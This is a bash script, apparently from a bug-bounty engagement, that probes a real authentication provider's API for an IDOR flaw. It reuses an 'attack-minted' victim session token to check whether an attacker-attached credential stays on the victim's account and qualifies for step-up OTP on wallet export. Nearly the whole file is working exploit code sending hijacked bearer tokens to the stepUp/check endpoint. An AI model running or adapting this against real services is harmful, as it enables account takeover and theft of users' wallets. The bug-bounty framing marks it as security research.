#!/bin/bash
# idor13e: stepUp/check with ATTACK-MINTED victim session (vatk_new_session.mini, minted 11:37, 24h)
# Q1: does the attacker-attached ev6 credential (c3fe17fa) still hang off victim account?
# Q2: is it in the step-up OTP-eligible credentials list (=> export OTP can target attacker inbox)?
source /home/z/my-project/scripts/tokens.sh
OUT=/home/z/my-project/recon/idor13
mkdir -p $OUT
H1="X-Request-Purpose: Research"; H2="X-Bugcrowd-Ninja: zeno0"; CT="Content-Type: application/json"
ENV_SDK="fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9"
API="https://app.dynamicauth.com/api/v0"
MINI=$(cat $OUT/victim_orig.mini)
FULL=$(grep -v HTTPCODE $OUT/../idor8/s1_spki.full | python3 -c "import sys,json;print(json.load(sys.stdin)['jwt'])")

s() { local name=$1 url=$2 data=$3 tok=$4
  code=$(curl -s -m 25 -X POST -H "$H1" -H "$H2" -H "$CT" -H "Authorization: Bearer $tok" -d "$data" -w "\nHTTPCODE:%{http_code}" "$url")
  echo "$code" > "$OUT/$name.full"
  echo "[$(sed -n 's/.*HTTPCODE://p' <<< "$code")] $name"
  grep -v HTTPCODE <<< "$code" | head -c 700; echo; echo
}

echo "== S1 stepUp/check {scope:wallet:export} with victim attack-session (mini) =="
s s1_check_min "$API/sdk/$ENV_SDK/stepUp/check" '{"scope":"wallet:export"}' "$MINI"

echo "== S2 same with full JWT (fallback) =="
s s2_check_full "$API/sdk/$ENV_SDK/stepUp/check" '{"scope":"wallet:export"}' "$FULL"

echo "== done — inspect credentials[] for zeno0+ev6 =="
